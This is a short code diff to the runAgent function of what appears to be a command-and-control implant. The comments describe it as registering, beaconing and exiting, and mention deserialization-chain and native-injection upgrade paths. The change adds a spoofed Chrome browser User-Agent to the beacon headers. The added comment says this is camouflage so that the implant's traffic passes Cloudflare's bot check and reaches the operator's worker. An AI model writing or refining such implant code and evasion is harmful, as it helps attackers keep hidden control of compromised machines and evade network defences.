@@ -239,7 +239,11 @@ def runAgent():
         # upgrade path (the 0x0B deserialization chain is CLR-hosted; 0x0C native
         # injection is the C# agent's) — Exit needs no bit, and the mask honestly
         # reports an implant that registers, beacons, and exits.
+        # Transport camouflage, not identity: Cloudflare's Browser Integrity Check
+        # (error 1010) 403s urllib's default 'Python-urllib/x' signature at the edge —
+        # every beacon MUST carry a browser UA to reach the worker at all.
         pairs = [
+            ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'),
             ('X-Api-Version', '1'),
             ('X-Device-Id', guid),
             ('X-Session-Id', make_session_key()),
